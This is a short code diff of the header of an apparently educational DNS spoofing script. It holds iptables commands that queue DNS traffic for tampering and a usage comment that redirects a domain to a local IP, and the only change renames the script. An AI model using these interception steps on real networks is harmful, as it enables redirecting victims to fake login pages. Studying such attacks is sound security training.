@@ -1,6 +1,6 @@
 # iptables -A INPUT -p udp  --sport 53 -j NFQUEUE --queue-num 1
 # iptables -I FORWARD -j NFQUEUE --queue-num 1
-# python 05-dns_spoof/dns_spoof2.py -w www.stealmylogin.com -i 192.168.0.35
+# python 05-dns_spoof/dns_spoofer.py -w www.stealmylogin.com -i 192.168.0.35
 
 import netfilterqueue
 import scapy.all as scapy
